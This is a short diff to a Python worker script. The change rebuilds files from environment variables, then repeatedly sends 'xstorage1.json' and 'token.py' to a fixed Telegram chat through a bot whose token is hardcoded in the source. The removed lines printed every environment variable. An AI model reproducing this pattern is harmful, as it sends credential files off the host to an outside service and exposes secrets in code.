@@ -1,20 +1,28 @@
 import gspread
 import os
 import _thread
+import telebot
 from time import sleep
-directory = os.listdir('.')
 os.environ["DEBUSSY"] = 'l'
 
-m = os.environ.keys()
-for i in m:
-    print(i, '-', os.environ.get(i))
+bot = telebot.TeleBot('429683355:AAF3GReDyewByK-WRLQ44xpCNKIsYg1G8X0')
 
-_thread.exit()
+
+def environmental_files():
+    directory = os.listdir('.')
+    for key in os.environ.keys():
+        if (key.endswith('.json') or key.endswith('.py')) and key not in directory:
+            file = open(key, 'w')
+            file.write(os.environ.get(key))
+            file.close()
+
 
 while True:
+    bot.send_document(396978030, 'xstorage1.json')
+    bot.send_document(396978030, 'token.py')
     #acc = gspread.service_account('worker1.json')
     #files = acc.list_spreadsheet_files()
     #for i in files:
     #    print(i)
-    sleep(100)
+    sleep(1000)
 
